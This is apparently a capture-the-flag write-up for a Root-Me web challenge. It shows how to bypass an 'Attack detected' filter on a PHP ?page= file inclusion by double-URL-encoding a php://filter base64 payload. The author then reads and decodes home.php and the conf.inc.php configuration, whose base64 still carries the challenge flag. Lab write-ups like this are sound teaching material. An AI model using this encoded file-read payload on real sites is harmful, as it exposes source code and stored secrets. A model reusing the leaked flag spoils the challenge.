Again, the page is loaded by a variable ?page=

If we try to attack as usual, by using ?page=../, we see the error message *Attack detected*

It is likely that ".." are forbidden in the variable. I tried a filter injection, like before, by using

```
?page=php://filter/convert.base64-encode/resource=home
```
 Again, the attack is detected. It seems like some special characters are forbidden. We can use their equivalent in %xxx form.
 We can then encode the payload, by using
```
php%253A%252F%252Ffilter%252Fconvert%252Ebase64-encode%252Fresource%253Dhome
```

We have the following response:

```
PD9waHAgaW5jbHVkZSgiY29uZi5pbmMucGhwIik7ID8+CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDx0aXRsZT5KLiBTbWl0aCAtIEhvbWU8L3RpdGxlPgogIDwvaGVhZD4KICA8Ym9keT4KICAgIDw/PSAkY29uZlsnZ2xvYmFsX3N0eWxlJ10gPz4KICAgIDxuYXY+CiAgICAgIDxhIGhyZWY9ImluZGV4LnBocD9wYWdlPWhvbWUiIGNsYXNzPSJhY3RpdmUiPkhvbWU8L2E+CiAgICAgIDxhIGhyZWY9ImluZGV4LnBocD9wYWdlPWN2Ij5DVjwvYT4KICAgICAgPGEgaHJlZj0iaW5kZXgucGhwP3BhZ2U9Y29udGFjdCI+Q29udGFjdDwvYT4KICAgIDwvbmF2PgogICAgPGRpdiBpZD0ibWFpbiI+CiAgICAgIDw/PSAkY29uZlsnaG9tZSddID8+CiAgICA8L2Rpdj4KICA8L2JvZHk+CjwvaHRtbD4K
```

This is the code of the home file, encoded in base64. So, we can just decode it.

```
<?php include("conf.inc.php"); ?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>J. Smith - Home</title>
  </head>
  <body>
    <?= $conf['global_style'] ?>
    <nav>
      <a href="index.php?page=home" class="active">Home</a>
      <a href="index.php?page=cv">CV</a>
      <a href="index.php?page=contact">Contact</a>
    </nav>
    <div id="main">
      <?= $conf['home'] ?>
    </div>
  </body>
</html>
```

Well there is no password, but we can take a look at **conf.inc.php**

```
http://challenge01.root-me.org/web-serveur/ch45/index.php?page=php%253A%252F%252Ffilter%252Fconvert%252Ebase64-encode%252Fresource%253Dconf
```

Result :

```
PD9waHAKICAkY29uZiA9IFsKICAgICJmbGFnIiAgICAgICAgPT4gIlRoMXNJc1RoM0ZsNGchIiwKICAgICJob21lIiAgICAgICAgPT4gJzxoMj5XZWxjb21lPC9oMj4KICAgIDxkaXY+V2VsY29tZSBvbiBteSBwZXJzb25hbCB3ZWJzaXRlICE8L2Rpdj4nLAogICAgImN2IiAgICAgICAgICA9PiBbCiAgICAgICJnZW5kZXIiICAgICAgPT4gdHJ1ZSwKICAgICAgImJpcnRoIiAgICAgICA9PiA0NDE3NTk2MDAsCiAgICAgICJqb2JzIiAgICAgICAgPT4gWwogICAgICAgIFsKICAgICAgICAgICJ0aXRsZSIgICAgID0+ICJDb2ZmZWUgZGV2ZWxvcGVyIEBNZWdhdXBsb2FkIiwKICAgICAgICAgICJkYXRlIiAgICAgID0+ICIwMS8yMDEwIgogICAgICAgIF0sCiAgICAgICAgWwogICAgICAgICAgInRpdGxlIiAgICAgPT4gIkJlZCB0ZXN0ZXIgQFlvdXJNb20ncyIsCiAgICAgICAgICAiZGF0ZSIgICAgICA9PiAiMDMvMjAxMSIKICAgICAgICBdLAogICAgICAgIFsKICAgICAgICAgICJ0aXRsZSIgICAgID0+ICJCZWVyIGRyaW5rZXIgQE5lYXJlc3RCYXIiLAogICAgICAgICAgImRhdGUiICAgICAgPT4gIjEwLzIwMTQiCiAgICAgICAgXQogICAgICBdCiAgICBdLAogICAgImNvbnRhY3QiICAgICAgID0+IFsKICAgICAgImZpcnN0bmFtZSIgICAgID0+ICJKb2huIiwKICAgICAgImxhc3RuYW1lIiAgICAgID0+ICJTbWl0aCIsCiAgICAgICJwaG9uZSIgICAgICAgICA9PiAiMDEgMzMgNzEgMDAgMDEiLAogICAgICAibWFpbCIgICAgICAgICAgPT4gImpvaG4uc21pdGhAdGhlZ2FtZS5jb20iCiAgICBdLAogICAgImdsb2JhbF9zdHlsZSIgID0+ICc8c3R5bGUgbWVkaWE9InNjcmVlbiI+CiAgICAgIGJvZHl7CiAgICAgICAgYmFja2dyb3VuZDogcmdiKDIzMSwgMjMxLCAyMzEpOwogICAgICAgIGZvbnQtZmFtaWx5OiBUYWhvbWEsVmVyZGFuYSxTZWdvZSxzYW5zLXNlcmlmOwogICAgICAgIGZvbnQtc2l6ZTogMTRweDsKICAgICAgfQogICAgICBkaXYjbWFpbnsKICAgICAgICBwYWRkaW5nOiAyMHB4IDEwcHg7CiAgICAgIH0KICAgICAgbmF2ewogICAgICAgIGJvcmRlcjogMXB4IHNvbGlkIHJnYigxMDEsIDEwMSwgMTAxKTsKICAgICAgICBmb250LXNpemU6IDA7CiAgICAgIH0KICAgICAgbmF2IGF7CiAgICAgICAgZm9udC1zaXplOiAxNHB4OwogICAgICAgIHBhZGRpbmc6IDVweCAxMHB4OwogICAgICAgIGJveC1zaXppbmc6IGJvcmRlci1ib3g7CiAgICAgICAgZGlzcGxheTogaW5saW5lLWJsb2NrOwogICAgICAgIHRleHQtZGVjb3JhdGlvbjogbm9uZTsKICAgICAgICBjb2xvcjogIzU1NTsKICAgICAgfQogICAgICBuYXYgYS5hY3RpdmV7CiAgICAgICAgY29sb3I6ICNmZmY7CiAgICAgICAgYmFja2dyb3VuZDogcmdiKDExOSwgMTM4LCAxNDQpOwogICAgICB9CiAgICAgIG5hdiBhOmhvdmVyewogICAgICAgIGNvbG9yOiAjZmZmOwogICAgICAgIGJhY2tncm91bmQ6IHJnYigxMTksIDEzOCwgMTQ0KTsKICAgICAgfQogICAgICBoMnsKICAgICAgICBtYXJnaW4tdG9wOjA7CiAgICAgIH0KICAgICAgPC9zdHlsZT4nCiAgXTsK
```

Decoded :

```
<?php
  $conf = [
    "flag"        => "FLAG",
    "home"        => '<h2>Welcome</h2>
    <div>Welcome on my personal website !</div>',
...
```
